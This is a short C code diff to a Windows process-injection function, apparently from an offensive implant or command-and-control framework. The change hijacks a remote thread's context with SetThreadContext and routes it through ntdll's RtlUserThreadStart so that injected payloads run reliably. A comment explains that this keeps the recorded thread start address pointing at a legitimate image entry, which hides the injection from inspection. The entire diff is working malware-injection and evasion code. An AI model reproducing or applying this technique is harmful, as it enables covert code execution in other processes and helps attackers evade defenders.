@@ -139,8 +139,25 @@ BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddre
 		return FALSE;
 	}
 
-	c.Rcx = (DWORD64)lpParameter;
-	c.Rip = (DWORD64)lpStartAddress;
+	/* route the thread through ntdll!RtlUserThreadStart instead of
+	 * jumping straight to the payload: a thread whose context skips the
+	 * ntdll bootstrap runs without the GS cookie / TLS / activation
+	 * frame setup and dies on its first fault silently (live: inject
+	 * into a running host reported execute-ok yet no session ever
+	 * checked in). RtlUserThreadStart(StartAddress, Parameter) - the
+	 * kernel-recorded StartAddress keeps pointing at the legitimate
+	 * image entry from CreateRemoteThread. */
+	{
+		void * ustart = (void *)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart");
+		if (ustart == NULL) {
+			TerminateThread(hThread, 0);
+			CloseHandle(hThread);
+			return FALSE;
+		}
+		c.Rcx = (DWORD64)lpStartAddress;
+		c.Rdx = (DWORD64)lpParameter;
+		c.Rip = (DWORD64)ustart;
+	}
 
 	if (!SetThreadContext(hThread, &c)) {
 		TerminateThread(hThread, 0);
